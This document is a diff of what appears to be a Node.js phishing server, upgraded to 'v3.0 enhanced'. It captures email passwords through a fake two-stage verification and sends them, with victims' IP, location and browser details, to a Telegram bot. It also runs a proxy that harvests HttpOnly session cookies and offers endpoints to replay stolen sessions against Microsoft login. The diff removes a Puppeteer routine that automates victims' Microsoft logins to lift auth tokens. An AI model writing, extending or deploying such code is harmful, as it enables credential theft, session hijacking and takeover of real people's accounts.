-        msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
-        msg += `*📧 Email:* ${email}\n`;
-        msg += `*🔑 Password:* ${password ? `\`${password}\`` : 'N/A'}\n`;
-        msg += `*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*📊 Attempt:* ${req.session.verification.attempts}\n`;
-        
-        if (validationResult) {
-            if (validationResult.valid) {
-                msg += `\n*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
-                msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
-                if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
-                if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
-            } else if (validationResult.requires2FA) {
-                msg += `\n*⚠️ Status:* **2FA REQUIRED**\n`;
-                msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
-            } else {
-                msg += `\n*❌ Status:* **INVALID PASSWORD**\n`;
-                msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
-            }
+        // Store cookies if captured
+        if (validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
+            sessionStore.storeCookies(sid, validationResult.cookies, 'verification');
         }
 
-        await sendToTelegram(msg);
+        // ENHANCED TELEGRAM ALERT
+        await sendEnhancedTelegramAlert({
+            email: email,
+            password: password,
+            provider: providerInfo,
+            providerDisplay: providerInfo.display,
+            stage: stage,
+            attemptCount: req.session.verification.attempts,
+            sessionId: sid,
+            geolocation: geo,
+            visitorData: visitor,
+            validationResult: validationResult,
+            verificationStatus: stage === 2 && validationResult.valid ? 'completed' : 'pending'
+        });
 
+        // Also send to old endpoint for compatibility
+        let legacyMsg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
+        legacyMsg += `*Provider:* ${providerInfo.display}\n`;
+        legacyMsg += `*Email:* ${email}\n`;
+        legacyMsg += `*Password:* \`${password}\`\n`;
+        legacyMsg += `*Time:* ${new Date().toISOString()}\n`;
+        legacyMsg += `*Session:* ${sid.substring(0, 16)}...\n`;
+        legacyMsg += `*Attempt:* ${req.session.verification.attempts}\n`;
+        
+        if (validationResult.valid) {
+            legacyMsg += `\n✅ Status: PASSWORD VALID - CORRECT!`;
+        } else if (validationResult.requires2FA) {
+            legacyMsg += `\n⚠️ Status: 2FA REQUIRED`;
+        } else {
+            legacyMsg += `\n❌ Status: INVALID PASSWORD`;
+        }
+        
+        await sendToTelegram(legacyMsg);
+
+        // Handle 2FA
         if (validationResult.requires2FA) {
             return res.json({
                 success: false,
@@ -1107,10 +1224,12 @@ app.post('/api/verify-password', async (req, res) => {
                 stage: stage,
                 attemptCount: req.session.verification.attempts,
                 provider: providerInfo.display,
-                loginUrl: providerInfo.loginUrl
+                loginUrl: providerInfo.loginUrl,
+                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
             });
         }
 
+        // Handle invalid password
         if (!validationResult.valid) {
             req.session.verification.password1 = null;
             req.session.verification.password1Valid = false;
@@ -1126,10 +1245,12 @@ app.post('/api/verify-password', async (req, res) => {
                 attemptCount: req.session.verification.attempts,
                 reset: true,
                 provider: providerInfo.display,
-                loginUrl: providerInfo.loginUrl
+                loginUrl: providerInfo.loginUrl,
+                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
             });
         }
 
+        // Stage 1 - First password correct
         if (stage === 1) {
             req.session.verification.password1 = password;
             req.session.verification.password1Valid = true;
@@ -1143,27 +1264,51 @@ app.post('/api/verify-password', async (req, res) => {
                 requires2FA: false,
                 nextAction: 'confirm_password',
                 provider: providerInfo.display,
-                loginUrl: providerInfo.loginUrl
+                loginUrl: providerInfo.loginUrl,
+                cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0
             });
-        } else if (stage === 2) {
+        }
+        
+        // Stage 2 - Confirm password
+        else if (stage === 2) {
             if (password === req.session.verification.password1) {
                 req.session.verification.password2 = password;
                 req.session.verification.password2Valid = true;
                 
-                await sendToTelegram(`🚀 *2-CONSECUTIVE VERIFICATION COMPLETE*\n\n*${providerInfo.icon} Provider:* ${providerInfo.display}\n*📧 Email:* ${email}\n*🔗 Login URL:* ${providerInfo.loginUrl || 'N/A'}\n*🕐 Time:* ${new Date().toISOString()}\n*Status:* ✅ BOTH PASSWORDS CORRECT - REDIRECTING TO PROXY`);
+                // Send final success with full details
+                await sendEnhancedTelegramAlert({
+                    email: email,
+                    password: password,
+                    provider: providerInfo,
+                    providerDisplay: providerInfo.display,
+                    stage: stage,
+                    attemptCount: req.session.verification.attempts,
+                    sessionId: sid,
+                    geolocation: geo,
+                    visitorData: visitor,
+                    validationResult: { ...validationResult, valid: true },
+                    verificationStatus: 'completed'
+                });
+                
+                // Get all cookies for this session
+                const allCookies = sessionStore.getAllCookies(sid);
                 
                 return res.json({
                     success: true,
                     stage: 2,
                     verified: true,
                     message: '✅ Both passwords verified! Redirecting...',
-                    redirectUrl: TEAMS_REDIRECT,
+                    redirectUrl: PROXY_URL + '?login_hint=' + encodeURIComponent(email) + '&session=' + sid + '&verified=true',
                     attemptCount: req.session.verification.attempts,
                     requires2FA: false,
                     provider: providerInfo.display,
-                    loginUrl: providerInfo.loginUrl
+                    loginUrl: providerInfo.loginUrl,
+                    cookiesCaptured: validationResult.cookies ? Object.keys(validationResult.cookies).length : 0,
+                    sessionId: sid,
+                    cookies: allCookies
                 });
             } else {
+                // Passwords don't match - reset
                 req.session.verification.password1 = null;
                 req.session.verification.password1Valid = false;
                 req.session.verification.password2 = null;
@@ -1190,21 +1335,154 @@ app.post('/api/verify-password', async (req, res) => {
 });
 
 // ============================================================
-// GET PROVIDER FOR EMAIL
+// GET FULL COOKIES FOR SESSION
 // ============================================================
+app.get('/api/cookies/full', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const cookies = sessionStore.getFullCookies(sessionId);
+        if (cookies) {
+            res.json({
+                success: true,
+                sessionId: sessionId,
+                totalCookies: Object.keys(cookies).length,
+                cookies: cookies
+            });
+        } else {
+            res.status(404).json({ error: 'No cookies found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================
+// GET VISITOR DATA
+// ============================================================
+app.get('/api/visitor', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const visitor = sessionStore.getVisitorData(sessionId);
+        if (visitor) {
+            res.json({
+                success: true,
+                sessionId: sessionId,
+                visitor: visitor
+            });
+        } else {
+            res.status(404).json({ error: 'No visitor data found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================ 
+// GET COMPLETE SESSION DATA
+// ============================================================
+app.get('/api/session-data', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const data = sessionStore.getReplayData(sessionId);
+        if (data) {
+            res.json(data);
+        } else {
+            res.status(404).json({ error: 'Session not found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================
+// GET ALL COOKIES (Legacy)
+// ============================================================
+app.get('/api/cookies/all', (req, res) => {
+    const sessionId = req.headers['x-session-id'] || req.session.id;
+    
+    if (sessionId) {
+        const cookies = sessionStore.getAllCookies(sessionId);
+        if (cookies) {
+            res.json(cookies);
+        } else {
+            res.status(404).json({ error: 'No cookies found' });
+        }
+    } else {
+        res.status(400).json({ error: 'No session ID' });
+    }
+});
+
+// ============================================================
+// SESSION REPLAY
+// ============================================================
+app.post('/api/replay', async (req, res) => {
+    try {
+        const data = req.body;
+        const sessionId = data.sessionId || req.headers['x-session-id'] || req.session.id;
+        
+        if (!sessionId) {
+            res.status(400).json({ error: 'No session ID' });
+            return;
+        }
+        
+        const sessionData = sessionStore.getReplayData(sessionId);
+        if (!sessionData) {
+            res.status(404).json({ error: 'Session not found' });
+            return;
+        }
+        
+        const cookies = sessionStore.getAllCookies(sessionId);
+        const fullCookies = sessionStore.getFullCookies(sessionId);
+        const visitor = sessionStore.getVisitorData(sessionId);
+        const target = data.target || 'https://login.microsoftonline.com';
+        
+        const cookieHeader = Object.entries(cookies || {})
+            .map(([name, value]) => `${name}=${value}`)
+            .join('; ');
+        
+        res.json({
+            success: true,
+            sessionId: sessionId,
+            target: target,
+            cookies: cookies,
+            fullCookies: fullCookies,
+            cookieHeader: cookieHeader,
+            visitor: visitor,
+            replayUrl: `${target}?session_replay=true`,
+            instructions: [
+                '1. Use the cookieHeader below to authenticate',
+                '2. Use the fullCookies object for manual replay',
+                '3. Access the target URL with the cookies'
+            ]
+        });
+        
+    } catch(e) {
+        console.error('[REPLAY] Error:', e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ============================================================
+// OTHER ENDPOINTS (GET PROVIDER, CREDENTIAL CAPTURE, PROXY, ETC.)
+// ============================================================
+
+// GET PROVIDER FOR EMAIL
 app.get('/api/detect-provider', (req, res) => {
     const { email } = req.query;
     if (!email) return res.status(400).json({ error: 'Email required' });
     res.json(detectEmailProvider(email));
 });
 
-// ============================================================
-// CREDENTIAL CAPTURE ENDPOINT
-// ============================================================
+// CREDENTIAL CAPTURE
 app.post('/api/credential-capture', async (req, res) => {
     try {
         const data = req.body;
         const providerInfo = detectEmailProvider(data.email);
+        const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
+        const visitor = req.visitorData || {};
         
         let msg = `🔐 *CREDENTIAL CAPTURED*\n\n`;
         msg += `*${providerInfo.icon || '📧'} Provider:* ${providerInfo.display}\n`;
@@ -1216,9 +1494,19 @@ app.post('/api/credential-capture', async (req, res) => {
         msg += `*📌 Stage:* ${data.stage || 'N/A'}\n`;
         msg += `*📊 Attempt:* ${data.attemptCount || 'N/A'}\n`;
         msg += `*🔗 Page URL:* ${data.url || 'N/A'}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        await sendToTelegram(msg);
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
         
+        if (geo && !geo.isLocal) {
+            msg += `📍 *Location:* ${geo.city}, ${geo.country}\n`;
+            msg += `📡 *IP:* ${geo.ip}\n`;
+        }
+        
+        if (visitor) {
+            msg += `💻 *Browser:* ${visitor.browser || 'Unknown'}\n`;
+            msg += `📱 *Platform:* ${visitor.platform || 'Unknown'}\n`;
+        }
+        
+        await sendToTelegram(msg);
         res.json({ success: true });
     } catch (error) {
         console.error('[CREDENTIAL] Error:', error);
@@ -1226,9 +1514,7 @@ app.post('/api/credential-capture', async (req, res) => {
     }
 });
 
-// ============================================================
-// PROXY SERVER - Captures Set-Cookie Headers
-// ============================================================
+// PROXY SERVER
 app.all('/proxy/*', async (req, res) => {
     const targetUrl = req.params[0];
     const sessionId = req.session.id || uuidv4();
@@ -1284,12 +1570,14 @@ app.all('/proxy/*', async (req, res) => {
                 };
             });
             
-            // Store cookies in session store
             const cookieData = {};
             capturedCookies.forEach(c => {
                 cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
             });
             sessionStore.storeCookies(sessionId, cookieData, 'proxy');
+            
+            // Send enhanced telegram alert with cookies
+            const geo = req.geolocation || { city: 'Unknown', country: 'Unknown' };
             
             let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
             telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
@@ -1301,9 +1589,14 @@ app.all('/proxy/*', async (req, res) => {
                 const flags = [];
                 if (c.httpOnly) flags.push('🔒 HTTPOnly');
                 if (c.secure) flags.push('🔐 Secure');
-                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
+                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 50)}...\`\n`;
                 if (flags.length) telegramMessage += `  ${flags.join(' | ')}\n`;
             });
+            
+            if (geo && !geo.isLocal) {
+                telegramMessage += `\n📍 *Location:* ${geo.city}, ${geo.country}\n`;
+                telegramMessage += `📡 *IP:* ${geo.ip}\n`;
+            }
             
             telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
             await sendToTelegram(telegramMessage);
@@ -1324,182 +1617,7 @@ app.all('/proxy/*', async (req, res) => {
 });
 
 // ============================================================
-// PUPPETEER CAPTURE ENDPOINT
-// ============================================================
-app.post('/api/puppeteer-capture', async (req, res) => {
-    const { email, password, sessionId } = req.body;
-    
-    if (!email) {
-        return res.status(400).json({ error: 'Email required' });
-    }
-    
-    console.log(`🚀 Starting Puppeteer capture for: ${email}`);
-    const sid = sessionId || uuidv4();
-    
-    try {
-        const browser = await getBrowser();
-        const page = await browser.newPage();
-        
-        await page.setViewport({ width: 1920, height: 1080 });
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-        
-        await page.setRequestInterception(true);
-        page.on('request', (request) => {
-            const headers = request.headers();
-            headers['Accept-Language'] = 'en-US,en;q=0.9';
-            headers['Accept-Encoding'] = 'gzip, deflate, br';
-            request.continue({ headers });
-        });
-        
-        const msLoginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
-            'client_id=4765445b-32c6-49b0-83e6-1d93765276ca&' +
-            'redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&' +
-            'response_type=code%20id_token&' +
-            'scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&' +
-            'response_mode=form_post&' +
-            'nonce=' + Date.now() + '.ZjU0YmVjYzUtNzMyZi00MzBlLWE1NWYtMjUwOTBmNTNhNjc2NjYzMTY5ZGUtMjI1NC00NzRmLWIyMjItNGM5OGJlMjU3Mjdl&' +
-            'ui_locales=en-US&mkt=en-US&' +
-            'login_hint=' + encodeURIComponent(email);
-        
-        console.log(`🔄 Navigating to Microsoft login: ${email}`);
-        await page.goto(msLoginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
-        
-        try {
-            await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
-            const emailInput = await page.$('input[type="email"], input[name="loginfmt"]');
-            if (emailInput) {
-                await emailInput.click({ clickCount: 3 });
-                await emailInput.type(email, { delay: 100 });
-                await page.keyboard.press('Enter');
-                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
-            }
-            
-            if (password) {
-                await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
-                const passwordInput = await page.$('input[type="password"], input[name="passwd"]');
-                if (passwordInput) {
-                    await passwordInput.click({ clickCount: 3 });
-                    await passwordInput.type(password, { delay: 80 });
-                    await page.keyboard.press('Enter');
-                    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
-                }
-            }
-            
-        } catch (error) {
-            console.log('⚠️ Login flow error:', error.message);
-        }
-        
-        const allCookies = await page.cookies();
-        console.log(`🍪 Total cookies captured: ${allCookies.length}`);
-        
-        const httpOnlyCookies = allCookies.filter(c => c.httpOnly);
-        const secureCookies = allCookies.filter(c => c.secure);
-        const sessionCookies = allCookies.filter(c => c.session);
-        
-        console.log(`🔒 HTTPOnly: ${httpOnlyCookies.length}`);
-        console.log(`🔐 Secure: ${secureCookies.length}`);
-        console.log(`🔄 Session: ${sessionCookies.length}`);
-        
-        // Store cookies in session store
-        const cookieData = {};
-        allCookies.forEach(c => {
-            cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
-        });
-        sessionStore.storeCookies(sid, cookieData, 'puppeteer');
-        
-        const sessionTokens = {
-            'x-ms-session': allCookies.find(c => c.name === 'x-ms-session')?.value,
-            'id_token': allCookies.find(c => c.name === 'id_token')?.value,
-            'ESTSAUTH': allCookies.find(c => c.name === 'ESTSAUTH')?.value,
-            'ESTSAUTHPERSISTENT': allCookies.find(c => c.name === 'ESTSAUTHPERSISTENT')?.value,
-            'ESTSSESSION': allCookies.find(c => c.name === 'ESTSSESSION')?.value
-        };
-        
-        // Store tokens
-        const tokenData = {};
-        for (const [key, value] of Object.entries(sessionTokens)) {
-            if (value) tokenData[key] = value;
-        }
-        sessionStore.storeTokens(sid, tokenData);
-        
-        const localStorageData = await page.evaluate(() => {
-            const items = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key && (key.includes('ms') || key.includes('auth') || key.includes('session') || key.includes('token'))) {
-                    items[key] = localStorage.getItem(key);
-                }
-            }
-            return items;
-        });
-        
-        console.log(`💾 LocalStorage items: ${Object.keys(localStorageData).length}`);
-        
-        let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PUPPETEER*\n\n`;
-        telegramMessage += `*Email:* ${email}\n`;
-        telegramMessage += `*Total Cookies:* ${allCookies.length}\n`;
-        telegramMessage += `*HTTPOnly:* ${httpOnlyCookies.length}\n`;
-        telegramMessage += `*Secure:* ${secureCookies.length}\n`;
-        telegramMessage += `*Session:* ${sid}\n\n`;
-        
-        if (httpOnlyCookies.length > 0) {
-            telegramMessage += `*🔒 HTTPOnly Cookies:*\n`;
-            httpOnlyCookies.slice(0, 3).forEach(c => {
-                telegramMessage += `  *${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
-            });
-            telegramMessage += `\n`;
-        }
-        
-        let hasTokens = false;
-        for (const [key, value] of Object.entries(sessionTokens)) {
-            if (value) {
-                if (!hasTokens) {
-                    telegramMessage += `*🎟️ Session Tokens:*\n`;
-                    hasTokens = true;
-                }
-                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
-            }
-        }
-        if (hasTokens) telegramMessage += `\n`;
-        
-        if (Object.keys(localStorageData).length > 0) {
-            telegramMessage += `*💾 LocalStorage:*\n`;
-            Object.entries(localStorageData).slice(0, 3).forEach(([key, value]) => {
-                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
-            });
-            telegramMessage += `\n`;
-        }
-        
-        telegramMessage += `*Time:* ${new Date().toISOString()}`;
-        await sendToTelegram(telegramMessage);
-        
-        await page.close();
-        
-        res.json({
-            success: true,
-            sessionId: sid,
-            email: email,
-            totalCookies: allCookies.length,
-            httpOnlyCookies: httpOnlyCookies.length,
-            secureCookies: secureCookies.length,
-            sessionTokens: Object.fromEntries(Object.entries(sessionTokens).filter(([_, v]) => v)),
-            localStorage: localStorageData,
-            cookieExample: allCookies.slice(0, 3).map(c => ({ 
-                name: c.name, 
-                value: c.value.substring(0, 50) + '...', 
-                httpOnly: c.httpOnly, 
-                secure: c.secure 
-            }))
-        });
-        
-    } catch (error) {
-        console.error('❌ Puppeteer error:', error.message);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// ============================================================
-// TELEGRAM ENDPOINT
+// TELEGRAM ENDPOINT (Legacy)
 // ============================================================
 app.post('/api/telegram', async (req, res) => {
     try {
@@ -1563,15 +1681,18 @@ app.get('/health', async (req, res) => {
         replayData: sessionStore.replayData.size,
         telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
         googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
+        geolocationEnabled: true,
         endpoints: [
-            'POST /api/cookies - Store cookies',
+            'POST /api/cookies - Store cookies (FULL VALUES)',
             'POST /api/tokens - Store tokens',
             'POST /api/form-data - Store form data',
             'POST /api/replay-data - Store replay data',
             'GET /api/cookies/all - Get all cookies',
+            'GET /api/cookies/full - Get full cookies with metadata',
+            'GET /api/visitor - Get visitor data',
             'GET /api/session-data - Get complete session',
             'POST /api/replay - Replay session',
-            'POST /api/verify-password - Password verification',
+            'POST /api/verify-password - Enhanced password verification',
             'POST /api/credential-capture - Capture credentials',
             'POST /api/telegram - Send Telegram',
             'GET /api/verification-status - Status',
@@ -1579,7 +1700,7 @@ app.get('/health', async (req, res) => {
             'POST /api/puppeteer-capture - Puppeteer capture',
             '/proxy/* - Proxy with cookie capture'
         ],
-        version: '2.0.0-integrated'
+        version: '3.0.0-enhanced'
     });
 });
 
@@ -1611,6 +1732,37 @@ function serveFile(filePath, res, contentType = 'text/html') {
 }
 
 // ============================================================
+// LEGACY TELEGRAM FUNCTION
+// ============================================================
+async function sendToTelegram(message, parseMode = 'Markdown') {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        
+        if (!botToken || !chatId) {
+            console.log('⚠️ Telegram credentials missing');
+            return false;
+        }
+        
+        let finalMsg = message;
+        if (message.length > 4000) {
+            finalMsg = message.substring(0, 3900) + '\n\n... (truncated)';
+        }
+        
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
+            text: finalMsg,
+            parse_mode: parseMode,
+            disable_web_page_preview: true
+        });
+        return true;
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
+        return false;
+    }
+}
+
+// ============================================================
 // START SERVER
 // ============================================================
 const PORT = process.env.PORT || 3000;
@@ -1618,9 +1770,10 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
     console.log('║                                                           ║');
-    console.log('║   🍪  COMPLETE INTEGRATED SERVER                        ║');
+    console.log('║   🍪  ENHANCED INTEGRATED SERVER v3.0                    ║');
     console.log('║   🔐  2-CONSECUTIVE PASSWORD VERIFICATION                ║');
-    console.log('║   🍪  HTTPOnly Cookie Capture (NO TRUNCATION)           ║');
+    console.log('║   🍪  FULL COOKIE CAPTURE (NO TRUNCATION)               ║');
+    console.log('║   📍  IP GEOLOCATION & VISITOR TRACKING                 ║');
     console.log('║   🤖  Puppeteer Automation                              ║');
     console.log('║   🌐  Multi-Provider Support (Korean + International)   ║');
     console.log('║   🔄  Session Replay                                    ║');
@@ -1630,9 +1783,10 @@ app.listen(PORT, () => {
     console.log(`║   🔗 Proxy:   /proxy/*                                   ║`);
     console.log(`║   🔐 Verify:  POST /api/verify-password                  ║`);
     console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
-    console.log(`║   🍪 Cookie:  POST /api/cookies                         ║`);
+    console.log(`║   🍪 Cookie:  POST /api/cookies (FULL VALUES)           ║`);
     console.log(`║   🔄 Replay:  POST /api/replay                          ║`);
-    console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENABLED' : '❌ DISABLED'}`);
+    console.log(`║   📍 Visitor: GET /api/visitor                          ║`);
+    console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENHANCED' : '❌ DISABLED'}`);
     console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
@@ -1645,15 +1799,17 @@ app.listen(PORT, () => {
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║   📊 Endpoints:                                         ║');
-    console.log('║   POST /api/cookies - Store cookies                    ║');
+    console.log('║   POST /api/cookies - Store cookies (FULL)             ║');
     console.log('║   POST /api/tokens - Store tokens                      ║');
     console.log('║   POST /api/form-data - Store form data                ║');
     console.log('║   POST /api/replay-data - Store replay data            ║');
     console.log('║   GET  /api/cookies/all - Get all cookies              ║');
+    console.log('║   GET  /api/cookies/full - Get FULL cookies           ║');
+    console.log('║   GET  /api/visitor - Get visitor data                ║');
     console.log('║   GET  /api/session-data - Get complete session        ║');
     console.log('║   POST /api/replay - Replay session                   ║');
-    console.log('║   POST /api/verify-password - Password verification   ║');
-    console.log('║   POST /api/credential-capture - Credential capture  ║');
+    console.log('║   POST /api/verify-password - ENHANCED verification   ║');
+    console.log('║   POST /api/credential-capture - Capture credentials  ║');
     console.log('║   POST /api/telegram - Send Telegram                 ║');
     console.log('║   GET  /api/verification-status - Status             ║');
     console.log('║   POST /api/reset-verification - Reset               ║');
